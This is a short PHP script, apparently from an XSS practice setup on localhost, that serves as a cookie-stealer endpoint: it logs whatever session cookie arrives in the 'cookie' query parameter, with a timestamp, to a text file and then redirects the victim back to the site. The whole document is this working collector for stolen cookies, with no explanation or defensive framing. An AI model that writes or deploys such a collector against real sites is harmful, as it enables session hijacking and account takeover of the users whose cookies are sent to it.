<?php
 $myfile = file_put_contents('cookies/cookie.txt',"\n".$_GET['cookie']." ".time(),FILE_APPEND | LOCK_EX);
 header('location:http://localhost/XSS/index.php')
?> 